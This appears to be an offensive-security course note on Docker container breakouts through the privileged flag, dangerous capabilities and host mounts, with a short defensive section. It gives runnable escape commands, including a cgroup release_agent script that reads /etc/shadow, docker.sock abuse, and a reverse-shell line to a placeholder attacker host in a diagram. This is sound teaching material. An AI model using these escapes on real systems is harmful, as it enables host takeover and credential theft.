---
tags: [cloud, advanced, container, kubernetes, vapt]
difficulty: advanced
module: "81 - Advanced Kubernetes and Container Breakouts"
topic: "81.05 Advanced Docker Breakouts Capabilities and Mounts"
---

# Advanced Docker Breakouts: Capabilities and Mounts

## Introduction to Container Isolation

A container is not a true virtual machine. It does not have its own kernel. Instead, a container is merely a standard Linux process that has been heavily sandboxed using native Linux kernel features. When we talk about "breaking out" of a container, we are talking about finding ways to bypass these isolation mechanisms to interact directly with the underlying host's kernel and filesystem.

The primary isolation mechanisms in Linux include:
1.  **Namespaces:** Isolate resources. (e.g., PID namespace hides other host processes, Network namespace provides a virtual network stack, Mount namespace isolates the filesystem tree).
2.  **Cgroups (Control Groups):** Restrict and measure resource usage (CPU, Memory, Disk I/O).
3.  **Linux Capabilities:** Break down the monolithic "root" privilege into smaller, distinct privileges.
4.  **Seccomp (Secure Computing Mode):** Filters and restricts which system calls a container can make to the kernel.
5.  **MAC Systems (AppArmor / SELinux):** Provide mandatory access control policies to restrict file access and execution.

A container breakout occurs when a container is over-privileged—either by being run with the `--privileged` flag, by being granted dangerous Linux Capabilities, or by mounting sensitive host directories.

## Exploiting the `--privileged` Flag

When a container is started with Docker's `--privileged` flag (or `securityContext: privileged: true` in Kubernetes), the container engine disables nearly all security features. It removes Seccomp filtering, AppArmor profiles, and grants *all* Linux capabilities to the container. Most importantly, it exposes all host devices in the container's `/dev` directory.

### The Device Mount Escape
Because the container has access to host block devices (like `/dev/sda1` or `/dev/nvme0n1`), the attacker can simply mount the host's root filesystem inside the container.

```bash
# 1. Identify the host's root partition
fdisk -l

# 2. Create a mount point
mkdir /mnt/host-root

# 3. Mount the block device
mount /dev/sda1 /mnt/host-root

# 4. Access the host filesystem!
chroot /mnt/host-root /bin/bash
```
Once chrooted, the attacker is effectively executing as `root` on the underlying host, with access to all host files, SSH keys, and systemd services.

## Exploiting Dangerous Linux Capabilities

If a container is not fully privileged but is granted specific dangerous capabilities (via `--cap-add`), an attacker can still engineer a breakout.

### 1. CAP_SYS_ADMIN
`CAP_SYS_ADMIN` is often considered the "new root". It is a massive catch-all capability that allows an array of administrative operations, including the ability to mount filesystems.

**The cgroup `release_agent` Escape:**
If a container has `CAP_SYS_ADMIN`, it can often interact with the `cgroup` virtual filesystem. The `release_agent` feature allows a script to be executed by the kernel (running outside the container context as true host root) whenever a cgroup becomes empty.

*The Exploit Script:*
```bash
# 1. Create a cgroup directory
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Discover the host path of the container
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# 4. Write the payload to the release_agent
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 5. Create the malicious script inside the container
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd

# 6. Trigger the execution by spawning a process in the cgroup and letting it die
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
When the short-lived process dies, the cgroup empties. The host kernel sees `notify_on_release` is 1, reads the `release_agent` file, and executes the `/cmd` script as root on the host. The output is written to the container's filesystem.

### 2. CAP_SYS_MODULE
This capability allows the container to insert and remove kernel modules (`insmod` / `rmmod`). Since all containers share the host's kernel, loading a malicious kernel module immediately compromises the host kernel. The attacker compiles a custom C module that implements a reverse shell or escalates privileges, uploads it to the container, and inserts it.

### 3. CAP_SYS_PTRACE
This allows the container to trace and observe other processes. While PID namespaces prevent seeing host processes, if the container shares the host PID namespace (`--pid=host`), `CAP_SYS_PTRACE` allows the attacker to inject malicious shellcode into highly privileged host processes (like `systemd` or `sshd`), gaining code execution on the host.

## Exploiting Dangerous Mounts

Even without capabilities, misconfigured volume mounts can lead to escapes.

### The Docker Socket (`/var/run/docker.sock`)
Mounting the Docker socket into a container is a common anti-pattern used by CI/CD systems (Docker-in-Docker) or monitoring agents. The socket is an unencrypted UNIX socket that provides full root-level access to the Docker API.

If an attacker finds `/var/run/docker.sock` mounted, they can use the `docker` client (or `curl`) to command the host's Docker daemon to launch a new, fully privileged container that mounts the host root.

```bash
# Check if docker socket is present
ls -la /var/run/docker.sock

# Download the docker client binary
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
tar -xzvf docker-20.10.9.tgz
cd docker/

# Use the local socket to deploy a privileged escape container
./docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
```
The attacker instantly drops into a root shell on the underlying host machine.

### Other Dangerous Host Mounts
- **`/proc` or `/sys`:** If mounted read-write, an attacker can modify kernel parameters (e.g., `core_pattern` exploit) to achieve host execution.
- **`/etc`:** Mounting the host's `/etc` directory allows the attacker to add a new user to `/etc/passwd` and `/etc/shadow`, or add their public SSH key to `/etc/ssh/`, granting persistent host access.

## Detailed ASCII Architecture Diagram

This diagram visualizes the `release_agent` cgroup breakout utilizing the `CAP_SYS_ADMIN` capability.

```text
  +-----------------------------------------------------------------------+
  |                          Host Operating System                        |
  |                                                                       |
  |  +-----------------------------------------------------------------+  |
  |  |                     Container Environment                       |  |
  |  |                                                                 |  |
  |  |  +-----------------------+                                      |  |
  |  |  |    Attacker Shell     | (Possesses CAP_SYS_ADMIN)            |  |
  |  |  +-----------------------+                                      |  |
  |  |             |                                                   |  |
  |  |             | 1. Mounts cgroup subsystem                        |  |
  |  |             v                                                   |  |
  |  |  +-----------------------+                                      |  |
  |  |  |  Cgroup VFS (/tmp)    |                                      |  |
  |  |  |  - release_agent      |<--- 2. Attacker writes path to       |  |
  |  |  |  - notify_on_release  |        malicious script (/cmd)       |  |
  |  |  +-----------------------+                                      |  |
  |  |             |                                                   |  |
  |  |             | 3. Triggers cgroup emptiness (process death)      |  |
  |  |             v                                                   |  |
  |  +-------------|---------------------------------------------------+  |
  |                |                                                      |
  |                v 4. Kernel detects empty cgroup                       |
  |                                                                       |
  |  +-----------------------------------------------------------------+  |
  |  |                        Host Linux Kernel                        |  |
  |  |                                                                 |  |
  |  |   5. Executes the file defined in 'release_agent' (/cmd)        |  |
  |  |      Context: ROOT user, Host Namespace (No Isolation)          |  |
  |  +-----------------------------------------------------------------+  |
  |                |                                                      |
  |                v 6. /cmd executes: bash -i >& /dev/tcp/ATT/4444    |
  |                                                                       |
  |  +-----------------------------------------------------------------+  |
  |  |     Attacker receives Reverse Shell as ROOT on the HOST Node    |  |
  |  +-----------------------------------------------------------------+  |
  +-----------------------------------------------------------------------+
```

## Defensive Measures

1.  **Drop Capabilities:** Use `securityContext.capabilities.drop: ["ALL"]`. Never grant `CAP_SYS_ADMIN`, `CAP_SYS_MODULE`, or `CAP_SYS_PTRACE` unless strictly necessary.
2.  **Never Use Privileged Mode:** Ensure Pod Security Standards (Restricted) are enforced to block `--privileged` and `hostPath` mounts globally across the cluster.
3.  **Read-Only Root Filesystem:** Run containers with a read-only root filesystem to prevent attackers from downloading tools or dropping malicious scripts.
4.  **Seccomp Profiles:** Ensure the default Docker/Runtime seccomp profile is enabled. This blocks dangerous system calls like `unshare` and `mount` even if certain capabilities are present.

## Real-World Attack Scenario

A continuous integration pipeline utilizes a Jenkins worker node running inside a Kubernetes pod. To allow Jenkins to build Docker images, the DevOps team mounts the node's `/var/run/docker.sock` into the Jenkins pod. 

An attacker finds an unpatched plugin vulnerability in Jenkins, achieving remote code execution as the `jenkins` user inside the pod. The attacker attempts to escalate privileges, but the pod is not running as root and lacks capabilities. However, they discover the mounted `docker.sock`. They download the static docker binary. Using the socket, they issue a command to run a new alpine container, attaching the host's `/` directory to `/mnt` inside the new container. They use this mechanism to append their SSH public key to the host's `/root/.ssh/authorized_keys` file. They then exit the container and SSH directly into the Kubernetes worker node as root from the internet, completely bypassing the cluster's network security groups and RBAC controls.

## Chaining Opportunities

Docker breakouts are the final stage of node compromise:
- **Application Vuln to Breakout:** Exploiting a web shell, identifying capabilities (e.g., using `amicontained`), and executing a cgroup escape to gain node root.
- **Breakout to Cluster Takeover:** Once an attacker breaks out to the host, they are root on the Kubelet node. They can read `/var/lib/kubelet/pki/` to steal the kubelet's client certificates and use them to impersonate the node to the API Server, stealing secrets belonging to all pods running on that node.
- **Breakout to Cloud Pivot:** With host access, the attacker can install packet sniffers (like `tcpdump`) on the host's physical network interface, capturing unencrypted traffic between pods, extracting credentials, or manipulating cloud metadata requests.

## Related Notes
- [[01 - Kubernetes Architecture and Attack Surface]]
- [[02 - Enumerating Kubernetes Clusters Kubelet API]]
- [[03 - Exploiting Unauthenticated Kubelet Endpoints]]
- [[04 - RBAC Exploitation and Privilege Escalation in K8s]]
